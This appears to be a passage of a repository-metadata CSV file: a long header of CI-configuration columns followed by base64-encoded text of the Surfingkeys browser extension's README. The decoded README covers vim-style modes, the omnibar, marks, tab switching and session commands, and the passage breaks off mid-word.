name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
IHRoYXQgeW91J2xsIHNlbGVjdCB0ZXh0IHdoZW4gbW92aW5nIGN1cnNvci4K
Ck5vdyBoZXJlIGlzIGEgc21hbGwgcHJhY3RpY2UsCgoxLiBwcmVzcyBgdmAg
eW91J2xsIHNlZSBgQ2FyZXRgCjEuIHVzZSB0aGUgVklNIGtleSBiaW5kaW5n
cyB0byBtb3ZlIGN1cnNvciB0byBzb21lIHdoZXJlLgoxLiBwcmVzcyBgdmAg
YWdhaW4sIHlvdSdsbCBzZWUgYFJhbmdlYC4KMS4gdXNlIHRoZSBWSU0ga2V5
IGJpbmRpbmdzIHRvIHNlbGVjdCBzb21lIHRleHQuCjEuIHByZXNzIGBzZ2Ag
dG8gc2VlIHdoYXQgd2lsbCBoYXBwZW4uCjEuIHByZXNzIGB2YCBhZ2FpbiB0
byBiYWNrIHRvIG5vcm1hbCBtb2RlLgoKQWxsIG1hcHBpbmdzIGFkZGVkIHdp
dGggYHZtYXBrZXlgIHdvcmsgaW4gdGhpcyBtb2RlLCB3aXRoIHNvbWUgYnVp
bHQtaW4gbWFwcGluZ3MgbGlrZSB0aG9zZSBpbiBWSU0gLSBgamAgYGtgIGBo
YCBgbGAgYGJgIGB3YGAwYCBgJGAgZXRjLgoKIVtzZWFyY2hfc2VsZWN0ZWRd
KGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fzc2V0cy8y
ODgyMDcvMTc2NDQyMTUvNzU5ZjFlNzAtNjFiMy0xMWU2LThiZjgtMGJkZmY3
ZDBjOTMzLmdpZikKCiogYHp6YCBtYWtlIGN1cnNvciBhdCBjZW50ZXIgb2Yg
d2luZG93LgoqIGBmYCBmb3J3YXJkIHRvIG5leHQgY2hhci4KKiBgRmAgYmFj
a3dhcmQgdG8gbmV4dCBjaGFyLgoqIGA7YCByZXBlYXQgbGF0ZXN0IGYsIEYu
CiogYCxgIHJlcGVhdCBsYXRlc3QgZiwgRiBpbiBvcHBvc2l0ZSBkaXJlY3Rp
b24uCgojIyMgSW5zZXJ0IG1vZGUKCldoZW4gZm9jdXMgaXMgc3dpdGNoZWQg
aW50byBhbnkgZWRpdGFibGUgZWxlbWVudCBieSB3aGF0ZXZlciBtZWFucyhg
aWAgaGludHMgb3IgYGZgIGhpbnRzIG9yIG1vdXNlIGNsaWNrKSwgSW5zZXJ0
IG1vZGUgaXMgb24uCgpBbGwgbWFwcGluZ3MgYWRkZWQgd2l0aCBgaW1hcGtl
eWAgd29yayBpbiB0aGlzIG1vZGUuCgoqIGBDdHJsIC0gaWAgdG8gb3BlbiB2
aW0gZWRpdG9yIHRvIGVkaXQuCiogYEN0cmwgLSAnYCB0byB0b2dnbGUgcXVv
dGVzIGluIGFuIGlucHV0IGVsZW1lbnQsIHRoaXMgaXMgdXNlZnVsIGZvciBz
ZWFyY2ggZW5naW5lcyBsaWtlIGdvb2dsZS4KKiBgQ3RybC1lYCBtb3ZlIHRo
ZSBjdXJzb3IgdG8gdGhlIGVuZCBvZiB0aGUgbGluZS4KKiBgQ3RybC1mYCBt
b3ZlIHRoZSBjdXJzb3IgdG8gdGhlIGJlZ2lubmluZyBvZiB0aGUgbGluZS4K
KiBgQ3RybC11YCBkZWxldGUgYWxsIGVudGVyZWQgY2hhcmFjdGVycyBiZWZv
cmUgdGhlIGN1cnNvci4KKiBgQWx0LWJgIG1vdmUgdGhlIGN1cnNvciBCYWNr
d2FyZCAxIHdvcmQuCiogYEFsdC1mYCBtb3ZlIHRoZSBjdXJzb3IgRm9yd2Fy
ZCAxIHdvcmQuCiogYEFsdC13YCBkZWxldGUgYSB3b3JkIGJhY2t3YXJkcy4K
KiBgQWx0LWRgIGRlbGV0ZSBhIHdvcmQgZm9yd2FyZHMuCgpgaW1hcGAgYW5k
IGBpdW5tYXBgIGZvciBpbnNlcnQgbW9kZS4KCiAgICBpbWFwKCcsLCcsICI8
RXNjPiIpOyAgICAgICAgLy8gcHJlc3MgY29tbWEgdHdpY2UgdG8gbGVhdmUg
Y3VycmVudCBpbnB1dCBib3guCiAgICBpbWFwKCc7OycsICI8Q3RybC0nPiIp
OyAgICAgLy8gcHJlc3Mgc2VtaWNvbG9uIHR3aWNlIHRvIHRvZ2dsZSBxdW90
ZS4KCiMjIyMgRW1vamkgY29tcGxldGlvbgoKV2hlbiB1c2VyIGlucHV0cyBh
IGNvbG9uIGFuZCAyKHNldCBieSBgc2V0dGluZ3Muc3RhcnRUb1Nob3dFbW9q
aWApIGNoYXJhY3RlcnMgc3VjaCBhcyBgOmdyYCBpbiBpbnNlcnQgbW9kZSwg
U3VyZmluZ2tleXMgd2lsbCB0cnkgdG8gZmluZCBtYXRjaGVkIGVtb2ppLCBh
bmQgbGlzdCB0aGVtIG91dCBpZiB0aGVyZSBhcmUgc29tZSBmb3VuZC4KCiFb
ZW1vamldKGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fz
c2V0cy8yODgyMDcvMjM2MDI0NTMvOTI0ZWQ3NjItMDI4Yi0xMWU3LTg2ZjMt
YmYzMTVjMGEyNDk5LmdpZikKCklmIHlvdSB3YW50IHRoaXMgZmVhdHVyZSBk
aXNhYmxlZCBjb21wbGV0ZWx5LCB1c2UgYmVsb3cgc2V0dGluZ3M6CgogICAg
aXVubWFwKCI6Iik7CgpJZiB5b3UnZCBsaWtlIGVtb2ppIHN1Z2dlc3Rpb25z
IHBvcHVwIGFzIHNvb24gYXMgeW91IGlucHV0IGNvbG9uLCB1c2UgYmVsb3c6
CgogICAgc2V0dGluZ3Muc3RhcnRUb1Nob3dFbW9qaSA9IDA7CgpbQ29tcGxl
dGUgbGlzdCBvZiBFbW9qaV0oaHR0cHM6Ly9naXRodWIuY29tL2Jyb29raG9u
Zy9TdXJmaW5na2V5cy9ibG9iL21hc3Rlci9wYWdlcy9lbW9qaS50c3YpCgoj
IyMgRmluZAoKYEZpbmRgIGlzIG5vdCBhY3R1YWxseSBhIG1vZGUsIGl0IGp1
c3QgYW5vdGhlciB3YXkgdG8gZW50ZXIgdmlzdWFsIG1vZGUuIFByZXNzIGAv
YCB0byBvcGVuIGZpbmQgYmFyLCB3aGljaCBzaXRzIGF0IGFsbW9zdCB0aGUg
c2FtZSBwb3NpdGlvbiB3aXRoIE1vZGUgaW5kaWNhdG9yLCB0eXBlIHNvbWV0
aGluZyB0aGVyZS4gQWxsIG9jY3VycmVuY2VzIG9mIHlvdXIgaW5wdXQgd2ls
bCBiZSBoaWdobGlnaHRlZC4gUHJlc3MgYEVudGVyYCB0byBmaW5pc2ggdGhl
IGZpbmRpbmcsIGFuZCB5b3UncmUgaW4gYENhcmV0YCB2aXN1YWwgbW9kZSBu
b3csIHByZXNzIGBuYCB0byBmaW5kIG5leHQsIGBOYCB0byBmaW5kIHByZXZp
b3VzLgoKUHJlc3MgYEN0cmwtRW50ZXJgIHRvIGZpbmQgZXhhY3RseSB0aGUg
d2hvbGUgd29yZCBpbnB1dCwgbGlrZSB3aXRoIHRoZSBpbnB1dCBgXGJrZXl3
b3JkXGJgLgoKIyMjIFBhc3NUaHJvdWdoIG1vZGUKClRvIHByZXNzIGBBbHQt
aWAgdG8gZW50ZXIgUGFzc1Rocm91Z2ggbW9kZSBnaXZlcyB5b3UgYSBjaGFu
Y2UgdG8gdGVtcG9yYXJpbHkgc3VwcHJlc3MgU3VyZmluZ0tleXMsIHdoaWNo
IG1lYW5zIFN1cmZpbmdrZXlzIHdpbGwgbm90IGNhcmUgYW55IGtleSBwcmVz
cyB1bnRpbCBsZWF2aW5nIHRoaXMgbW9kZSBieSBwcmVzc2luZyBgRXNjYC4g
SW4gdGhpcyBtb2RlLCB5b3UgY291bGQgdXNlIGJ1aWx0LWluIHNob3J0Y3V0
cyBmcm9tIGFueSBzaXRlIGl0c2VsZi4gUGxlYXNlIHNlZSBbRmVhdHVyZSBS
ZXF1ZXN0OiBpbXBsZW1lbnQgVmltaXVtLXN0eWxlIGluc2VydCBtb2RlIMK3
IElzc3VlICM2NTZdKGh0dHBzOi8vZ2l0aHViLmNvbS9icm9va2hvbmcvU3Vy
ZmluZ2tleXMvaXNzdWVzLzY1NikgZm9yIHdoeSB3ZSBicm91Z2h0IHRoaXMg
aW4gYW5kIHRoZSBkaWZmZXJlbmNlIGJldHdlZW4gYEFsdC1pYCBhbmQgYEFs
dC1zYC4KClRvIHByZXNzIGBwYCB0byBlbnRlciBlcGhlbWVyYWwgUGFzc1Ro
cm91Z2ggbW9kZSwgd2hpY2ggd2lsbCBhdXRvbWF0aWNhbGx5IHF1aXQgYWZ0
ZXIgMSBzZWNvbmQuIElmIHRoZSBkZWZhdWx0IHRpbWVvdXQgZG9lcyBmaXQg
eW91ciBjYXNlLCBhZGQgYmVsb3cgaW50byB5b3VyIG93biBzZXR0aW5ncyBz
Y3JpcHQgdG8gbWFrZSBpdCAxNTAwbXMuCgogICAgbWFwa2V5KCdwJywgJyMw
ZW50ZXIgZXBoZW1lcmFsIFBhc3NUaHJvdWdoIG1vZGUgdG8gdGVtcG9yYXJp
bHkgc3VwcHJlc3MgU3VyZmluZ0tleXMnLCBmdW5jdGlvbigpIHsKICAgICAg
ICBOb3JtYWwucGFzc1Rocm91Z2goMTUwMCk7CiAgICB9KTsKCiMjIE9tbmli
YXIKClRoZSBvbW5pYmFyIHByb3ZpZGVzIGtpbmRzIG9mIGZ1bmN0aW9ucyB0
aGF0IG5lZWQgdXNlciBpbnB1dCwgZm9yIGV4YW1wbGUsCgoqIE9wZW4gdXJs
KGZyb20gYm90aCBib29rbWFya3MgYW5kIGhpc3RvcnkpIHdpdGggYHRgCiog
T3BlbiBib29rbWFya3Mgd2l0aCBgYmAKKiBPcGVuIHNlYXJjaCBlbmdpbmVz
IHdpdGggYG9nYCAvIGBvd2AgLi4uCiogT3BlbiBjb21tYW5kcyB3aXRoIGA6
YAoKIyMjIGtleSBiaW5kaW5ncyBpbiBPbW5pYmFyCiogYEVudGVyYCB0byBv
cGVuIHNlbGVjdGVkIGl0ZW0gYW5kIGNsb3NlIG9tbmliYXIuCiogYEN0cmwt
RW50ZXJgIHRvIG9wZW4gc2VsZWN0ZWQgaXRlbSwgYnV0IGtlZXAgb21uaWJh
ciBvcGVuIGZvciBtb3JlIGl0ZW1zIHRvIGJlIG9wZW5lZC4KKiBgU2hpZnQt
RW50ZXJgIHRvIG9wZW4gc2VsZWN0ZWQgaXRlbSBpbiBjdXJyZW50IHRhYiBh
bmQgY2xvc2Ugb21uaWJhci4gSWYgeW91J2QgbGlrZSB0byBvcGVuIGluIGN1
cnJlbnQgdGFiIGJ5IGRlZmF1bHQsIHBsZWFzZSB1c2UgYGdvYC4KKiBgVGFi
YCB0byBmb3J3YXJkIGN5Y2xlIHRocm91Z2ggdGhlIGNhbmRpZGF0ZXMuCiog
YFNoaWZ0LVRhYmAgdG8gYmFja3dhcmQgY3ljbGUgdGhyb3VnaCB0aGUgY2Fu
ZGlkYXRlcy4KKiBgQ3RybC0uYCB0byBzaG93IHJlc3VsdHMgb2YgbmV4dCBw
YWdlCiogYEN0cmwtLGAgdG8gc2hvdyByZXN1bHRzIG9mIHByZXZpb3VzIHBh
Z2UKKiBgQ3RybC1jYCB0byBjb3B5IGFsbCBsaXN0ZWQgaXRlbXMKCkluIG9t
bmliYXIgb3BlbmVkIHdpdGggYHRgOgoKYEN0cmwgLSBkYCB0byBkZWxldGUg
ZnJvbSBib29rbWFyayBvciBoaXN0b3J5CgpJbiBvbW5pYmFyIG9wZW5lZCB3
aXRoIGBiYDoKCmBDdHJsIC0gU2hpZnQgLSA8YW55IGxldHRlcj5gIHRvIGNy
ZWF0ZSB2aW0tbGlrZSBtYXJrCgohW3NlYXJjaF9lbmdpbmVdKGh0dHBzOi8v
Y2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fzc2V0cy8yODgyMDcvMTc2
NDQyMTQvNzU5ZWYxZDQtNjFiMy0xMWU2LTliZDktNzBjMzhjOGI4MGUwLmdp
ZikKCmBjbWFwYCBjb3VsZCBiZSB1c2VkIGZvciBPbW5pYmFyIHRvIGNoYW5n
ZSBtYXBwaW5ncywgZm9yIGV4YW1wbGU6CgogICAgY21hcCgnPEN0cmwtbj4n
LCAnPFRhYj4nKTsKICAgIGNtYXAoJzxDdHJsLXA+JywgJzxTaGlmdC1UYWI+
Jyk7CgojIyMgQWRkIGJvb2ttYXJrCmBhYmAgaXMgYSBzaG9ydGN1dCB0byBi
b29rbWFyayBjdXJyZW50IHBhZ2UuIEFuIE9tbmliYXIgaXMgZGlzcGxheWVk
IGZvciB5b3UgdG8gY2hvb3NlIGEgZm9sZGVyIHRvIHBsYWNlIHRoZSBuZXcg
Ym9va21hcmsgYWZ0ZXIgeW91IHByZXNzZWQgYGFiYC4gSWYgeW91IHdhbnQg
dG8gcGxhY2UgdGhlIG5ldyBib29rbWFyayBpbnRvIGEgbmV3IGZvbGRlciwg
eW91IGNvdWxkIGlucHV0IGZvbGRlciBuYW1lIC0tICoqd2hpY2ggbXVzdCBi
ZSBlbmRlZCB3aXRoIGAvYCoqIGluIE9tbmliYXIuIEZvciBleGFtcGxlLCBJ
IGNob29zZSBmb2xkZXIgYC9Cb29rbWFya3MgQmFyL3Rvb2wvYCwgYW5kIGFw
cGVuZCBgYWJjL2AsIHRoZW4gY3VycmVudCBwYWdlIHdpbGwgYmUgYm9va21h
cmtlZCBpbnRvIGAvQm9va21hcmtzIEJhci90b29sL2FiYy9gLiBJZiB0aGVy
ZSBpcyBubyBgL2AgYmVoaW5kIGBhYmNgLCBgYWJjYCB3aWxsIGJlIHVzZWQg
YXMgdGl0bGUgb2YgdGhlIG5ldyBib29rbWFyay4KCiMjIFNlYXJjaCBzZWxl
Y3RlZCB3aXRoCgpNeSBmYXZvcml0ZSBmZWF0dXJlIGZyb20gd2hlbiBJIHdh
cyB1c2luZyBGaXJlZm94LiBGb3IgYm90aCBGaXJlZm94IGFuZCBDaHJvbWUs
IHRoZSBleHRlbnNpb25zIG1ha2UgaXQgdGhyb3VnaCBjb250ZXh0IG1lbnUu
IFN1cmZpbmdrZXlzIG1ha2VzIGl0IHRocm91Z2gga2V5IG1hcHBpbmdzLiBC
eSBkZWZhdWx0LCB3aGVuIHlvdSBwcmVzcyBgc2dgIGluIG5vcm1hbCBtb2Rl
LCBpdCB3aWxsIHNlYXJjaCBzZWxlY3RlZCB0ZXh0IHdpdGggZ29vZ2xlLCBp
ZiB0aGVyZSBpcyBub25lIHNlbGVjdGVkLCBpdCB3aWxsIHNlYXJjaCB0ZXh0
IGZyb20gc3lzdGVtIGNsaXBib2FyZCB3aXRoIGdvb2dsZS4gSW4gdmlzdWFs
IG1vZGUsIGl0IHdpbGwgc2VhcmNoIHNlbGVjdGVkIHRleHQgd2l0aCBnb29n
bGUuCgpUaGUgYGdgIGluIGBzZ2AgaXMgYSBzZWFyY2ggYWxpYXMgZm9yIGdv
b2dsZSwgdGhlcmUgYXJlIHNvbWUgb3RoZXIgYnVpbHQtaW4gc2VhcmNoIGFs
aWFzZXMgLS0gbGlrZSBgd2AgZm9yIGJpbmcuIFNvIHByZXNzIGBzd2AgdG8g
c2VhcmNoIHNlbGVjdGVkIHdpdGggYmluZy4gUmVmZXIgdG8gW0FkZCBzZWFy
Y2ggYWxpYXMgdG8gb21uaWJhcl0oI2FkZC1zZWFyY2gtYWxpYXMtdG8tb21u
aWJhcikgdG8gYWRkIHlvdXIgb3duIHNlYXJjaCBhbGlhcywgZXNwZWNpYWxs
eSB0aG9zZSBzZWFyY2ggZW5naW5lcyBmb3IgY29tcGFueSBpbnNpZGUuCgpC
ZXNpZGVzIHRoYXQsIHRoZXJlIGlzIGEgYHNvZ2AsIHRvIHNlYXJjaCBzZWxl
Y3RlZCB0ZXh0IG9ubHkgaW4gdGhpcyBzaXRlIHdpdGggZ29vZ2xlLiBGb3Ig
YHNvZ2AsIGBzYCBpcyB0aGUgc2VhcmNoX2xlYWRlcl9rZXksIGBvYCBpcyB0
aGUgb25seV90aGlzX3NpdGVfa2V5LCBgZ2AgaXMgdGhlIHNlYXJjaCBhbGlh
cy4KClRoZSBzZWFyY2hfbGVhZGVyX2tleSBgc2AgcGx1cyBjYXBpdGFsIGFs
aWFzIGBHYCB3aWxsIHNlYXJjaCBzZWxlY3RlZCB3aXRoIGdvb2dsZSBpbnRl
cmFjdGl2ZWx5LCBhbGwgb3RoZXIgc2VhcmNoIGFsaWFzZXMgYW5kIHRob3Nl
IHlvdSBhZGRlZCB0aHJvdWdoIEFQSSBgYWRkU2VhcmNoQWxpYXNYYCB3b3Jr
IGluIHNhbWUgd2F5LgoKIyMgVmltLWxpa2UgbWFya3MKCllvdSBjYW4gY3Jl
YXRlIHZpbS1saWtlIG1hcmtzIGJ5IHByZXNzaW5nIGBtYCwgZm9sbG93ZWQg
YnkgYSB3b3JkIGNoYXJhY3RlcigwLTkgLyBhLXogLyBBLVopLCB1c2VkIGFz
IG1hcmsgbmFtZS4gRm9yIGV4YW1wbGUsIGlmIHlvdSBwcmVzcyBgbWFgIG9u
IHRoaXMgcGFnZSwgeW91J2xsIGNyZWF0ZSBhIG1hcmsgbmFtZWQgYGFgIHdo
aWNoIHBvaW50cyB0byB0aGlzIHBhZ2UuIFRoZW4gcHJlc3NpbmcgYCdhYCBh
bnl3aGVyZSwgeW91J2xsIGp1bXAgdG8gdGhpcyBwYWdlLgoKSW4gdGhpcyB3
YXksIHRoZSBjcmVhdGVkIG1hcmsgYWx3YXlzIHBvaW50cyB0byBjdXJyZW50
IFVSTC4gWW91IGNhbiBhbHNvIGNyZWF0ZSB2aW0tbGlrZSBtYXJrcyBmcm9t
IHRoZSBib29rbWFya3MuIFRyeSBmb2xsb3dpbmcgc3RlcHM6CgoxLiBwcmVz
cyBgYmAgdG8gb3BlbiBib29rbWFya3MuCjEuIHR5cGUgc29tZXRoaW5nIHRv
IGxvY2F0ZSB0aGUgVVJMIHlvdSdkIGxpa2UgdG8gY3JlYXRlIHZpbS1saWtl
IG1hcmsgZm9yLgoxLiBIb2xkIEN0cmwgKyBTaGlmdCwgcHJlc3MgYSBtYXJr
IG5hbWUsIHN1Y2ggYXMgYGZgLgoKVGhlbiBhZnRlcndhcmRzIGAnRmAgd2ls
bCBvcGVuIHRoYXQgVVJMIGRpcmVjdGx5LgoKVGhpcyBpcyB2ZXJ5IHVzZWZ1
bCBmb3IgdGhvc2UgcGFnZXMgeW91IGFjY2VzcyB2ZXJ5IGZyZXF1ZW50bHku
IGBvbWAgdG8gY2hlY2sgb3V0IGFsbCB0aGUgdmltLWxpa2UgbWFya3MgeW91
IGhhdmUgY3JlYXRlZC4KCiMjIFN3aXRjaCB0YWJzCgpCeSBkZWZhdWx0LCBw
cmVzc2luZyBgVGAgd2lsbCBzaG93IGFsbCBvcGVuZWQgdGFicyBpbiBhbiBv
dmVybGF5LCB0aGVuIHByZXNzaW5nIHRoZSBoaW50IGNoYXIsIHdpbGwgc3dp
dGNoIHRvIHRoZSByZWxhdGVkIHRhYi4KCiFbdGFic19vdmVybGF5XShodHRw
czovL2Nsb3VkLmdpdGh1YnVzZXJjb250ZW50LmNvbS9hc3NldHMvMjg4MjA3
LzEwNTQ0NjM2LzI0NTQ0N2Y2LTc0NTctMTFlNS04MzcyLTYyYjhmNjMzNzE1
OC5wbmcpCgpUaGVyZSBpcyBgc2V0dGluZ3MudGFic1RocmVzaG9sZGAgaGVy
ZS4gV2hlbiB0b3RhbCBvZiBvcGVuZWQgdGFicyBleGNlZWRzIGBzZXR0aW5n
cy50YWJzVGhyZXNob2xkYChkZWZhdWx0IGFzIDkpLCBvbW5pYmFyIHdpbGwg
YmUgdXNlZCBmb3IgY2hvb3NpbmcgdGFicy4KCiFbdGFic19vbW5pYmFyXSho
dHRwczovL2Nsb3VkLmdpdGh1YnVzZXJjb250ZW50LmNvbS9hc3NldHMvMjg4
MjA3LzEwNTQ0NjMwLzFmYmRkMDJjLTc0NTctMTFlNS04MjNjLTE0NDExMzEx
YzMxNS5wbmcpCgpJZiB5b3UgcHJlZmVyIHRvIHVzZSBvbW5pYmFyIGFsd2F5
cywgdXNlIGJlbG93IG1hcHBpbmc6CgogICAgbWFwa2V5KCc8U3BhY2U+Jywg
J0Nob29zZSBhIHRhYiB3aXRoIG9tbmliYXInLCBmdW5jdGlvbigpIHsKICAg
ICAgICBGcm9udC5vcGVuT21uaWJhcih7dHlwZTogIlRhYnMifSk7CiAgICB9
KTsKCndoaWNoIHdvcmtzIHNhbWUgYXM6CgogICAgc2V0dGluZ3MudGFic1Ro
cmVzaG9sZCA9IDA7CgpUaGUgdGFicyBhcmUgZGlzcGxheWVkIGluIE1SVSBv
cmRlciBieSBkZWZhdWx0LCBlaXRoZXIgaW4gb21uaWJhciBvciBvdmVybGF5
LiBJZiB5b3Ugd2FudCB0aGVtIGluIG5hdHVyYWwgb3JkZXIsIHVzZToKCiAg
ICBzZXR0aW5ncy50YWJzTVJVT3JkZXIgPSBmYWxzZTsKCiMjIENvbW1hbmRz
CgpgOmAgdG8gb3BlbiBvbW5pYmFyIGZvciBjb21tYW5kcywgdGhlbiB5b3Ug
Y2FuIGV4ZWN1dGUgYW55IHByZS1kZWZpbmVkIHRoZXJlLiBUaGUgcmVzdWx0
IHdpbGwgYmUgZGlzcGxheWVkIGJlbG93IHRoZSBvbW5pYmFyLgoKICAgIC8v
IGNyZWF0ZSBzaG9ydGN1dHMgZm9yIHRoZSBjb21tYW5kIHdpdGggZGlmZmVy
ZW50IHBhcmFtZXRlcnMKICAgIG1hcCgnc3BhJywgJzpzZXRQcm94eU1vZGUg
YWx3YXlzJyk7CiAgICBtYXAoJ3NwYicsICc6c2V0UHJveHlNb2RlIGJ5aG9z
dCcpOwogICAgbWFwKCdzcGQnLCAnOnNldFByb3h5TW9kZSBkaXJlY3QnKTsK
CkJlc2lkZXMgY29tbWFuZHMsIHlvdSBjYW4gYWxzbyBydW4gamF2YXNjcmlw
dCBjb2RlLgoKIVtjb21tYW5kc19pbl9vbW5pYmFyXShodHRwczovL2Nsb3Vk
LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hc3NldHMvMjg4MjA3LzExNTI3ODAx
L2ZhZGVlODJjLTk5MWQtMTFlNS05MmU5LWIwNTQ3OTZhNmE3NS5wbmcpCgoj
IyBTbW9vdGggc2Nyb2xsCgpTbW9vdGggc2Nyb2xsIHdvcmtzIGZvciBhbnkg
c2Nyb2xsYWJsZSBlbGVtZW50LiBJdCBpcyBvbiBieSBkZWZhdWx0LCB0byB0
dXJuIGl0IG9mZiBhcyBiZWxvdzoKCiAgICBzZXR0aW5ncy5zbW9vdGhTY3Jv
bGwgPSBmYWxzZTsKCmBqYC9ga2Agc2Nyb2xscyBpbiBvbmUgc3RlcCB3aXRo
IHNpemUgYXMgNzAsIHlvdSBjb3VsZCBjaGFuZ2UgaXQgYXMgYmVsb3c6Cgog
ICAgc2V0dGluZ3Muc2Nyb2xsU3RlcFNpemUgPSAxNDA7CgojIyBTZXNzaW9u
IG1hbmFnZW1lbnQKClRvIGNyZWF0ZSBzZXNzaW9uIGluIENocm9tZSB3aXRo
IFN1cmZpbmdrZXlzIHdpbGwgc2F2ZSBVUkxzIGZvciBhbGwgdGFicywgYW5k
IHRvIG9wZW4gYSBzZXNzaW9uIHdpbGwgb3BlbiBhbGwgdGhlIFVSTHMgb2Yg
dGhlIHNlc3Npb24gaW4gZGlmZmVyZW50IHRhYiwgc28gYmFzaWNhbGx5IGEg
c2Vzc2lvbiBpcyBhIGxpc3Qgb2YgVVJMcywgd2hpY2ggaGFzIGEgbmFtZS4K
CiogYFpaYCB3aWxsIHNhdmUgYWxsIGN1cnJlbnQgdGFicyBpbnRvIGEgc2Vz
c2lvbiBuYW1lZCBgTEFTVGAgdGhlbiBxdWl0LgoqIGBaUmAgd2lsbCByZXN0
b3JlIHRoZSBzZXNzaW9uIG5hbWVkIGBMQVNUYC4KKiBgWlFgIHdpbGwganVz
dCBxdWl0LgoKWW91IGNhbiBjcmVhdGUgbXVsdGlwbGUgc2Vzc2lvbnMgd2l0
aCBkaWZmZXJlbnQgbmFtZXMgaW4gY29tbWFuZCBtb2RlLiBQcmVzcyBgOmAg
dG8gb3BlbiBvbW5pYmFyIGZvciBjb21tYW5kcywgdGhlbiBpbnB1dDoKCiAg
ICBjcmVhdGVTZXNzaW9uIHdvcmtzCgpTdXJmaW5na2V5cyB3aWxsIGNyZWF0
ZSBhIHNlc3Npb24gbmFtZWQgYHdvcmtzYCBmb3IgeW91LCB0byBvcGVuIHRo
ZSBzZXNzaW9uIHdpdGggY29tbWFuZCBpbnB1dCBhczoKCiAgICBvcGVuU2Vz
c2lvbiB3b3JrcwoKVG8gbGlzdCBhbGwgeW91ciBzYXZlZCBzZXNzaW9uczoK
CiAgICBsaXN0U2Vzc2lvbgoKVG8gZGVsZXRlIGEgc2Vzc2lvbjoKCiAgICBk
ZWxldGVTZXNzaW9uIHdvcmtzCgojIyBSZXBlYXRzIGFjdGlvbiBieSBwcmVz
c2luZyBudW1iZXIgYmVmb3JlIG1hcGtleQoKSWYgeW91IG5lZWQgcmVwZWF0
IHNvbWUgYWN0aW9uIHNldmVyYWwgdGltZXMsIGp1c3QgcHJlc3MgYSBudW1i
ZXIgYmVmb3JlIG1hcGtleSwgc3VjaCBhcyBgM2RgLCB3aGljaCB3aWxsIHNj
cm9sbCBkb3duIDMgcGFnZXMuIFJlcGVhdHMgYWxzbyB3b3JrcyBmb3IgVGFi
IG5hdmlnYXRpb24sIGZvciBleGFtcGxlLCB5b3UncmUgbm93IG9uIHRoZSAx
c3QgVGFiLCBhbmQgeW91IHdhbnQgdG8gc3dpdGNoIHRvIHRoZSA0dGggVGFi
LAoKKiBwcmVzcyBgM1JgIHRvIGFjaGlldmUgdGhhdAoqIGAzRWAgd2lsbCBz
d2l0Y2ggYmFjayB0byAxc3QgVGFiLgoKQW5vdGhlciBleGFtcGxlIHRvIG1v
dmUgb25lIFRhYiwgc2F5LCB5b3UncmUgb24gdGhlIDEydGggVGFiIG9mIDIz
IHRhYnMuCgoqIGAxMTw8YCB3aWxsIG1vdmUgY3VycmVudCB0YWIgdG8gYmVn
aW5uaW5nLgoqIGAxMD4+YCB3aWxsIG1vdmUgY3VycmVudCB0YWIgdG8gZW5k
LgoKVXN1YWxseSwgeW91IG5lZWQgbm90IGNvdW50IHRoZSBudW1iZXIsIHlv
dSBqdXN0IHByZWZpeCBhIGxhcmdlIG51bWJlciBzdWNoIGFzIGA5OTw8YCwg
aWYgeW91IHdhbnQgdG8gbW92ZSBhIHRhYiB0byBiZWdpbm5pbmcgb3IgZW5k
LgoKIyMgSG90a2V5IHRvIHRvZ2dsZSBTdXJmaW5na2V5cwoKQnkgZGVmYXVs
